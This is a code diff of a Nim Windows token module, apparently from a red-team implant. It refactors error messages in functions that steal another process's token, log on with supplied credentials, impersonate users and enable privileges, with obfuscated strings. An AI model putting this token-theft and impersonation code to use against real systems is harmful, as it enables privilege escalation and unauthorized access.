@@ -1,5 +1,6 @@
 import winim/lean 
 import strformat
+import ./io
 import ../../common/[types, utils]
 
 #[
@@ -65,7 +66,7 @@ proc getCurrentToken*(desiredAccess: ACCESS_MASK = TOKEN_QUERY): HANDLE =
     if status != STATUS_SUCCESS:
         status = apis.NtOpenProcessToken(CURRENT_PROCESS, desiredAccess, addr hToken)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
     return hToken
 
@@ -111,7 +112,7 @@ proc getTokenStatistics(apis: Apis, hToken: HANDLE): tuple[tokenId, tokenType: s
 
     status = apis.NtQueryInformationToken(hToken, tokenStatistics, addr pStats, cast[ULONG](sizeof(pStats)), addr returnLength)
     if status != STATUS_SUCCESS: 
-        raise newException(CatchableError, protect("NtQueryInformationToken - Token Statistics ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
 
     let 
         tokenType = if cast[TOKEN_TYPE](pStats.TokenType) == tokenPrimary: protect("Primary") else: protect("Impersonation")
@@ -127,16 +128,16 @@ proc getTokenUser(apis: Apis, hToken: HANDLE): tuple[username, sid: string] =
 
     status = apis.NtQueryInformationToken(hToken, tokenUser, NULL, 0, addr returnLength)
     if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
-        raise newException(CatchableError, protect("NtQueryInformationToken - Token User [1] ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
     
     pUser = cast[PTOKEN_USER](LocalAlloc(LMEM_FIXED, returnLength))
     if pUser == NULL:
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError, GetLastError().getError())
     defer: LocalFree(cast[HLOCAL](pUser))
     
     status = apis.NtQueryInformationToken(hToken, tokenUser, cast[PVOID](pUser), returnLength, addr returnLength)
     if status != STATUS_SUCCESS:
-        raise newException(CatchableError, protect("NtQueryInformationToken - Token User [2] ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
     
     return (apis.sidToName(pUser.User.Sid), apis.sidToString(pUser.User.Sid))
 
@@ -148,7 +149,7 @@ proc getTokenElevation(apis: Apis, hToken: HANDLE): bool =
     
     status = apis.NtQueryInformationToken(hToken, tokenElevation, addr pElevation, cast[ULONG](sizeof(pElevation)), addr returnLength)
     if status != STATUS_SUCCESS: 
-        raise newException(CatchableError, protect("NtQueryInformationToken - Token Elevation ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
 
     return cast[bool](pElevation.TokenIsElevated)
 
@@ -160,16 +161,16 @@ proc getTokenGroups(apis: Apis, hToken: HANDLE): string =
 
     status = apis.NtQueryInformationToken(hToken, tokenGroups, NULL, 0, addr returnLength)
     if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
-        raise newException(CatchableError, protect("NtQueryInformationToken - Token Groups [1] ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
     
     pGroups = cast[PTOKEN_GROUPS](LocalAlloc(LMEM_FIXED, returnLength))
     if pGroups == NULL:
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError, GetLastError().getError())
     defer: LocalFree(cast[HLOCAL](pGroups))
     
     status = apis.NtQueryInformationToken(hToken, tokenGroups, cast[PVOID](pGroups), returnLength, addr returnLength)
     if status != STATUS_SUCCESS:
-        raise newException(CatchableError, protect("NtQueryInformationToken - Token Groups [2] ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
 
     let 
         groupCount = pGroups.GroupCount
@@ -187,16 +188,16 @@ proc getTokenPrivileges(apis: Apis, hToken: HANDLE): string =
         
     status = apis.NtQueryInformationToken(hToken, tokenPrivileges, NULL, 0, addr returnLength)
     if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
-        raise newException(CatchableError, protect("NtQueryInformationToken - Token Privileges [1] ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
     
     pPrivileges = cast[PTOKEN_PRIVILEGES](LocalAlloc(LMEM_FIXED, returnLength))
     if pPrivileges == NULL:
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError, GetLastError().getError())
     defer: LocalFree(cast[HLOCAL](pPrivileges))
     
     status = apis.NtQueryInformationToken(hToken, tokenPrivileges, cast[PVOID](pPrivileges), returnLength, addr returnLength)
     if status != STATUS_SUCCESS:
-        raise newException(CatchableError, protect("NtQueryInformationToken - Token Privileges [2] ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
 
     let 
         privCount = pPrivileges.PrivilegeCount
@@ -254,7 +255,7 @@ proc impersonate*(apis: Apis, hToken: HANDLE) =
         
         status = apis.NtDuplicateToken(hToken, TOKEN_IMPERSONATE or TOKEN_QUERY, addr oa, FALSE, tokenImpersonation, addr impersonationToken)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, protect("NtDuplicateToken ") & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
     else: 
         # Use the original token if it is already an impersonation token
@@ -263,7 +264,7 @@ proc impersonate*(apis: Apis, hToken: HANDLE) =
     # Impersonate the token in the current thread (ImpersonateLoggedOnUser)
     status = apis.NtSetInformationThread(CURRENT_THREAD, threadImpersonationToken, addr impersonationToken, cast[ULONG](sizeof(HANDLE)))
     if status != STATUS_SUCCESS: 
-        raise newException(CatchableError, protect("NtSetInformationThread ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
 
     defer: discard apis.NtClose(impersonationToken)            
 
@@ -281,7 +282,7 @@ proc rev2self*() =
     status = apis.NtSetInformationThread(CURRENT_THREAD, threadImpersonationToken, addr hToken, cast[ULONG](sizeof(HANDLE)))
     
     if status != STATUS_SUCCESS: 
-        raise newException(CatchableError, protect("RevertToSelf ") & $status.toHex())        
+        raise newException(CatchableError, status.getNtError())        
 
 #[
     Create a new access token from a username, password and domain name triplet.
@@ -304,7 +305,7 @@ proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_L
     var hToken: HANDLE 
     let provider: DWORD = if logonType == LOGON32_LOGON_NEW_CREDENTIALS: LOGON32_PROVIDER_WINNT50 else: LOGON32_PROVIDER_DEFAULT
     if LogonUserA(username, domain, password, logonType, provider, addr hToken) == FALSE:
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError, GetLastError().getError())
     defer: discard apis.NtClose(hToken)
     
     apis.impersonate(hToken)
@@ -325,7 +326,7 @@ proc enablePrivilege*(privilegeName: string, enable: bool = true): string =
     defer: discard apis.NtClose(hToken)
 
     if LookupPrivilegeValueW(NULL, newWideCString(privilegeName), addr luid) == FALSE: 
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError,GetLastError().getError())
 
     # Enable privilege
     tokenPrivs.PrivilegeCount = 1
@@ -334,7 +335,7 @@ proc enablePrivilege*(privilegeName: string, enable: bool = true): string =
 
     status = apis.NtAdjustPrivilegesToken(hToken, FALSE, addr tokenPrivs, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), addr oldTokenPrivs, addr returnLength)
     if status != STATUS_SUCCESS: 
-        raise newException(CatchableError, protect("NtAdjustPrivilegesToken ") & $status.toHex())        
+        raise newException(CatchableError, status.getNtError())        
 
     let action = if enable: protect("Enabled") else: protect("Disabled")
     return fmt"{action} {apis.privilegeToString(addr luid)}."
@@ -365,13 +366,13 @@ proc stealToken*(pid: int): string =
     # Open a handle to the target process
     status = apis.NtOpenProcess(addr hProcess, PROCESS_QUERY_INFORMATION, addr oa, addr clientId)
     if status != STATUS_SUCCESS: 
-        raise newException(CatchableError, protect("NtOpenProcess ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
     defer: discard apis.NtClose(hProcess)
 
     # Open a handle to the primary access token of the target process
     status = apis.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, addr hToken)
     if status != STATUS_SUCCESS: 
-        raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())
+        raise newException(CatchableError, status.getNtError())
     defer: discard apis.NtClose(hToken)
 
     apis.impersonate(hToken)
